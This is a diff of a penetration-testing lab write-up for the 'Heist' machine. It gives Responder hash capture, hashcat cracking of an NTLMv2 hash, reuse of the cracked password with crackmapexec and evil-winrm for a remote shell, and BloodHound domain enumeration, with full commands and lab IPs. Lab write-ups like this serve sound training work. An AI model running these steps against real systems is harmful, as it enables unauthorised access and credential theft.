@@ -406,28 +406,30 @@ responder -I tun0 -wv
   
 ![](Images/Pasted%20image%2020221012181516.png)
 
-#### - After sending the request we receive a NetNTLMv2 hash for the user **enox** comes in to our Responder output.
-
+- After sending the request, our Responder response contains an NTLMv2 hash for the user enox.
+  
 ![](Images/Pasted%20image%2020221012181626.png)
 
-#### - Copy the entire hash including the username and use a text editor to paste it into a file named hash.txt. After that, use the following commands to find the cracking mode needed for this hash type and then to begin cracking it:
-
+- Using vim we copy the whole hash, including the username, into a file called hash.txt. Next, we crack this hash type by using the following command to determine the required cracking mode:
+  
 hashcat -h | grep -i "ntlmv2"
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
-#### - After no time at all, the hash is cracked and the password extracted from the cracked.txt file we output the results into.
+- The hash is cracked in a matter of moments and the password is saved in the "cracked.txt" file.
+  
+- We examine the "cracked.txt" file, revealing the password California and the username enox.
 
-#### - Cat "cracked.txt" file which shows username enox and password california
+We then use crackmapexec to establish a remote session with the user enox. We run the command "crackmapexec winrm <target_IP> -d heist.offsec -u enox -p california -x "whoami"" and discover that the user "heist/enox" is running on the target machine. We then establish a winrm shell using the command "evil-winrm -i <target_IP> -u enox -p california".
 
+- We type the following command and discover that the target machine is being used by user “heist/enox”:
 
-#### - Typed crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x "whoami" and found user "heist/enox" is running on the target machine:
-
+crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x “whoami”
 
 ![](Images/Pasted%20image%2020221012181836.png)
 
 
-#### - Typed "evil-winrm -i 192.168.123.165 -u enox -p california" and received the below winrm shell:
-
+- We receive the following winrm shell when we typed "evil-winrm -i 192.168.123.165 -u enox -p california":
+  
 ![](Images/Pasted%20image%2020221012212318.png)
 #evil-winrm  #Winrmshell
 
@@ -437,20 +439,22 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 # Lateral Movement to user
 ## Local Enumeration
 
-#### - Typed "net user enox" and noted current user "enox" is a part of "Web Admins" group memberships
-
+- We type "net user enox" and observe that the current user "enox" belongs to the "Web Admins" group.
+  
 ![](Images/Pasted%20image%2020221012182010.png)
 #Windowsuserenumeration
 
-#### - Attempted to enumerate Privelege Escalation vectors by utilizing PowerUp.ps1 and other privilege escalation scripts but found nothing
-
-#### - Typed "sudo neo4j console"  on my kali machine and logged into the console using my neo4j credentials
+- We use PowerUp.ps1 and other privilege escalation scripts in an attempt to list Privilege Escalation vectors, but nothing is discovered.
+  
+- On our Kali machine, we type "sudo neo4j console" and enter our neo4j credentials to log into the console.
 #neo4jconsole
 
-#### - Navigated to another terminal on my kali machine and typed "bloodhound" and logged into bloodhound utilizing my neo4j credentials
+- On our Kali machine, we open a another terminal, type "bloodhound," and log on to bloodhound.
 #bloodhound
 
-#### - Navigated back to another terminal session on my kali machine and typed "bloodhound-python -u enox -p california -ns 192.168.81.165 -d heist.offsec -c all" and retreived the following computers, domains, groups and users information in .json format from the target machine in order to upload the information to bloodhound:
+- We open a new terminal and enter the below command. This retrieves the machines, domains, groups and users information in .json format from the target machine:
+
+bloodhound-python -u enox -p california -ns 192.168.81.165 -d heist.offsec -c all
 
 ![](Images/Pasted%20image%2020221012213928.png)
 ![](Images/Pasted%20image%2020221012214003.png)
